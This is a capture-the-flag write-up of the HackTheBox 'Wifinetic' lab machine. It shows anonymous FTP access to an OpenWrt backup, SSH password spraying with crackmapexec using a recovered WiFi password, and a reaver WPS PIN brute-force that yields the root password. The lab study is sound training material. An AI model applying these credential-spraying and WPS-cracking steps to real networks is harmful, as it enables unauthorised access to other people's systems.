---
title: Wifinetic
tags:
  - HackTheBox
  - Easy
  - Linux
  - FTP
  - SSH
date: 2025-02-04T00:00:00Z
---
![](Pasted%20image%2020250204182044.png)

## Reconnaissance

First, I added the new host to my known ones:

```shell
sudo echo "10.10.11.247 wifinetic.htb" | sudo tee -a /etc/hosts
```

Then, I performed a Nmap scan:

```shell
nmap -sC -T4 -p- wifinetic.htb > sC.txt

[redacted]
PORT   STATE SERVICE
21/tcp open  ftp
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
| -rw-r--r--    1 ftp      ftp          4434 Jul 31  2023 MigrateOpenWrt.txt
| -rw-r--r--    1 ftp      ftp       2501210 Jul 31  2023 ProjectGreatMigration.pdf
| -rw-r--r--    1 ftp      ftp         60857 Jul 31  2023 ProjectOpenWRT.pdf
| -rw-r--r--    1 ftp      ftp         40960 Sep 11  2023 backup-OpenWrt-2023-07-26.tar
|_-rw-r--r--    1 ftp      ftp         52946 Jul 31  2023 employees_wellness.pdf
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.10.14.21
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp open  ssh
| ssh-hostkey: 
|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)
|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
53/tcp open  domain
```

As `anonymous` ftp login is allowed, I checked what content was available from port `21`:

```shell
ftp anonymous@wifinetic.htb
> ls
229 Entering Extended Passive Mode (|||47893|)
150 Here comes the directory listing.
-rw-r--r--    1 ftp      ftp          4434 Jul 31  2023 MigrateOpenWrt.txt
-rw-r--r--    1 ftp      ftp       2501210 Jul 31  2023 ProjectGreatMigration.pdf
-rw-r--r--    1 ftp      ftp         60857 Jul 31  2023 ProjectOpenWRT.pdf
-rw-r--r--    1 ftp      ftp         40960 Sep 11  2023 backup-OpenWrt-2023-07-26.tar
-rw-r--r--    1 ftp      ftp         52946 Jul 31  2023 employees_wellness.pdf
```

So I downloaded everything and inspected it. I found an OS called `OpenWrt`:

>[!Info]
>*OpenWrt (from open wireless router) is an open-source project for embedded operating systems based on Linux, primarily used on embedded devices to route network traffic.*

I also got a (maybe) interesting mail:

![](Pasted%20image%2020250204182733.png)

I also decompressed the `backup-OpenWrt-2023-07-26.tar`:

```shell
tar -xvf backup-OpenWrt-2023-07-26.tar     
./etc/
./etc/config/
./etc/config/system
./etc/config/wireless
./etc/config/firewall
./etc/config/network
./etc/config/uhttpd
./etc/config/dropbear
./etc/config/ucitrack
./etc/config/rpcd
./etc/config/dhcp
./etc/config/luci
./etc/uhttpd.key
./etc/uhttpd.crt
./etc/sysctl.conf
./etc/inittab
./etc/group
./etc/opkg/
./etc/opkg/keys/
./etc/opkg/keys/4d017e6f1ed5d616
./etc/hosts
./etc/passwd
./etc/shinit
./etc/rc.local
./etc/dropbear/
./etc/dropbear/dropbear_ed25519_host_key
./etc/dropbear/dropbear_rsa_host_key
./etc/shells
./etc/profile
./etc/nftables.d/
./etc/nftables.d/10-custom-filter-chains.nft
./etc/nftables.d/README
./etc/luci-uploads/
./etc/luci-uploads/.placeholder
```

I got inside `wireless` two passwords for what seem to be two interfaces:

![](Pasted%20image%2020250204183054.png)

I can read `/etc/passwd` file:

![](Pasted%20image%2020250204183327.png)

There is a user called `netadmin`, which may have the previous password assigned.

As I don't initially know I can perform some ssh password bruteforcing with **crackmapexec**:

```shell
crackmapexec ssh wifinetic.htb -u users.txt -p 'VeRyUniUqWiFIPasswrd1!' --continue-on-success
```

![](Pasted%20image%2020250204184118.png)

> As previously said, we've got credentials :D `netadmin:VeRyUniUqWiFIPasswrd1!`

### User flag

![](Pasted%20image%2020250204184230.png)

## Privilege Escalation

If we search for binaries with capabilities:

```shell
getcap -r / 2>/dev/null

/usr/lib/x86_64-linux-gnu/gstreamer1.0/gstreamer-1.0/gst-ptp-helper = cap_net_bind_service,cap_net_admin+ep
/usr/bin/ping = cap_net_raw+ep
/usr/bin/mtr-packet = cap_net_raw+ep
/usr/bin/traceroute6.iputils = cap_net_raw+ep
/usr/bin/reaver = cap_net_raw+ep
```

The last one is interesting:

>[!Info]
>*Reaver is a powerful tool for Linux that can be used to exploit vulnerabilities in the WiFi Protected Setup (WPS) protocol. It is designed to perform brute-force attacks on WPS PINs to recover WPA/WPA2 passphrases.*

I inspected the network interfaces:

```shell
ifconfig

[redacted]
eth0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 10.10.11.247  netmask 255.255.254.0  broadcast 10.10.11.255

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0

mon0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        unspec 02-00-00-00-02-00-30-3A-00-00-00-00-00-00-00-00  txqueuelen 1000  (UNSPEC)

wlan0: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.168.1.1  netmask 255.255.255.0  broadcast 192.168.1.255

wlan1: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.168.1.23  netmask 255.255.255.0  broadcast 192.168.1.255

wlan2: flags=4099<UP,BROADCAST,MULTICAST>  mtu 1500
        ether 02:00:00:00:02:00  txqueuelen 1000  (Ethernet)
```

There are six network interfaces!

If we run `iw dev` we will get more info about those interfaces:

```shell
iw dev
phy#2
        Interface mon0
                ifindex 7
                wdev 0x200000002
                addr 02:00:00:00:02:00
                type monitor
                txpower 20.00 dBm
        Interface wlan2
                ifindex 5
                wdev 0x200000001
                addr 02:00:00:00:02:00
                type managed
                txpower 20.00 dBm
phy#1
        Unnamed/non-netdev interface
                wdev 0x10000034d
                addr 42:00:00:00:01:00
                type P2P-device
                txpower 20.00 dBm
        Interface wlan1
                ifindex 4
                wdev 0x100000001
                addr 02:00:00:00:01:00
                ssid OpenWrt
                type managed
                channel 1 (2412 MHz), width: 20 MHz (no HT), center1: 2412 MHz
                txpower 20.00 dBm
phy#0
        Interface wlan0
                ifindex 3
                wdev 0x1
                addr 02:00:00:00:00:00
                ssid OpenWrt
                type AP
                channel 1 (2412 MHz), width: 20 MHz (no HT), center1: 2412 MHz
                txpower 20.00 dBm
```

This gives a bunch of information about each physical network interface as well as the interfaces on them.
- `wlan0` is on `phy0`. It’s running as an access point (`type AP`) with SSID of `OpenWrt` on channel 1
- `wlan1` is on `phy1`, and is running in `managed` mode, which suggests it’s a client. Given that the SSID, channel, and center frequency are the same as `wlan0`, this is a client on that access point
- `wlan2` and `mon0` are on `phy2`. `wlan2` is also acting as a client (in `managed` mode), where as `mon0` is in monitor mode as suspected. `wlan2` doesn’t show any connection

The target AP is `wlan0`, which has a MAC from the `iw` command above of `02:00:00:00:00:00`. The monitor-mode interface is `mon0`. I'll use `reaver`'s `wash` command to get the BSSID/MAC:
- *Content from [Outpost24](https://outpost24.com/blog/wps-cracking-with-reaver/)*

```shell
reaver -i mon0 -b 02:00:00:00:00:00 -vv
```

> Got it!

![](Pasted%20image%2020250204185712.png)

WPS PIN: `12345670`
WPA PSK: `WhatIsRealAnDWhAtIsNot51121!`

This previous password works for `root`, so I can now get root flag.

### Root flag

![](Pasted%20image%2020250204185932.png)

==Machine pwned!==